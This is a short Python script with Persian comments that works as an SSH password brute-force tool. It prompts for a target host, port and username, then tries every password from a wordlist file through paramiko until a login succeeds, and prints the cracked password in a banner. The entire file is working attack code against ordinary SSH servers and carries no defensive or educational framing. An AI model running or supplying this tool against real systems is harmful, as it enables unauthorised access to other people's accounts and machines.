import paramiko
import shutil
from tqdm import tqdm
import banners

# مسیر فایل متنی که پسوردها در آن قرار دارند
password_file_path = 'passwords.txt'

# دریافت اطلاعات SSH از کاربر
banners.anonymous()
hostname = input("Enter the SSH hostname: ")
port = int(input("Enter the SSH port (default 22): ") or 22)
username = input("Enter the SSH username: ")

# باز کردن فایل و خواندن پسوردها
with open(password_file_path, 'r') as file:
    passwords = file.readlines()

# متغیر کمکی برای بررسی پیدا شدن پسورد
password_found = False

# تابع برای نمایش باکس
def print_box(message):
    columns = shutil.get_terminal_size().columns
    box_width = columns - 4
    print()
    print(f'╔{"═" * box_width}╗')
    print(f'║{" " * box_width}║')
    print(f'║{message.center(box_width)}║')
    print(f'║{" " * box_width}║')
    print(f'╚{"═" * box_width}╝')

# تابع برای امتحان کردن پسورد
def try_password(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password, timeout=5)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        tqdm.write(f'Error: {e}')
        return False

# اجرای دستور برای هر پسورد تا زمانی که اتصال موفقیت‌آمیز باشد
for password in tqdm(passwords, desc="Trying passwords"):
    password = password.strip()  # حذف کاراکترهای اضافی مانند \n
    tqdm.write(f'Trying password: {password}')  # نمایش پسوردی که امتحان می‌شود
    if try_password(hostname, port, username, password):
        print_box(f'Password found: {password}')
        password_found = True
        break

if not password_found:
    print_box('Password not found!')
